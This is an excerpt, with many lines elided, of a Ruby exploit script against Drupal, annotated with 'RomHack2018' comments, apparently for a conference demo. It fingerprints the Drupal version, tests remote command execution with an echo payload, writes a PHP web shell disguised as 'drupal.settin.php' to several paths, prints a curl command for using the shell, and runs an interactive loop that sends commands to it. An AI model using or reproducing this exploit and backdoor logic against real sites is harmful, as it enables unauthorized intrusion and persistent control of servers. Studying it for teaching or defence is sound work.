...
### RomHack2018 ###
# - Addedd comments
# - Fixed a problem with the web shell path var
...
webshell = "drupal.settin.php"
writeshell = true

### RomHack 2018 ###
# We use a system() call to execute commands on the remote server (RCE)
...
### RomHack 2018 ###
# The Drupal exploit is here, depends from Drupal version
...
### RomHack2018 ###
# Detect remote drupal version based on the content of some Drupal default file 
# Try and get version
$drupalverion = nil
# Possible URLs
url = [
...
### RomHack2018 ###
# testing exploit without writing it. Just echo a random string (8 chars) and see if Drupal echoes the value (see gen_evil_url() for details)
#  NOTICE: this is the first "volatile" payload (just an echo)
...
### RomHack2018 ###
# try to write the backdoor in 3 different paths, and check if any works
...
paths.each do|path|
  ...
  # tee to the destination file (webshell = "drupal.settin.php")
...
if webshellpath
  ...
  # Feedback
  ### RomHack2018 ###
  # PATCH - wrong webshell path, use var webshellpath instead
  puts "[*] Fake shell:   curl '#{$target}#{webshellpath}' -d 'c=whoami'"
...
### RomHack2018 ###
# Interactive shell so we can execute system() commands
# Forever loop
loop do
  # Default value
  result = "ERROR"
  ...
  if webshellpath
    ...
    ### RomHack2018 ###
    # PATCH - wrong webshell path, use var webshellpath instead
    result = http_post("#{$target}#{webshellpath}", "c=#{command}").body
